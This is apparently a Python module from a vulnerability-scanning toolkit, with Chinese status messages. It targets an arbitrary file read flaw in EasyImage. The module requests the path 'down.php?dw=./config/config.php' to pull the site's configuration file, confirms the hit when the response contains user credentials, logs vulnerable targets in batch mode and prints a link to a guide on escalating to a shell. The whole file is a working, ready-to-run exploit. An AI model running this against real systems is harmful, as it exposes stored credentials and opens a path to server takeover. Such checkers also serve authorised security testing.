#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()


class EasyImageInfoScan:

    def run(self, urls):
        url = urls + '/application/down.php?dw=./config/config.php'
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "'user'=>" in response.text:
                OutPrintInfoSuc("EasyImage", f'存在EasyImage任意文件读取漏洞{url}')
                if not self.batch:
                    OutPrintInfo("EasyImage", "可通过以下连接进行GETSHELL")
                    OutPrintInfo("EasyImage", "https://mp.weixin.qq.com/s/guZ6Ud39qpYKbLWnFprz0Q")
                else:
                    OutPutFile("easyimage_file_read.txt",f'存在EasyImage任意文件读取漏洞{url}')
            else:
                if not self.batch:
                    OutPrintInfo("EasyImage", '不存在EasyImage任意文件读取漏洞')
        except Exception:
            if not self.batch:
                OutPrintInfo("EasyImage", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("EasyImage", '开始执行EasyImage任意文件读取漏洞')
        self.run(url)
        if not self.batch:
            OutPrintInfo("EasyImage", 'EasyImage任意文件读取检测结束')
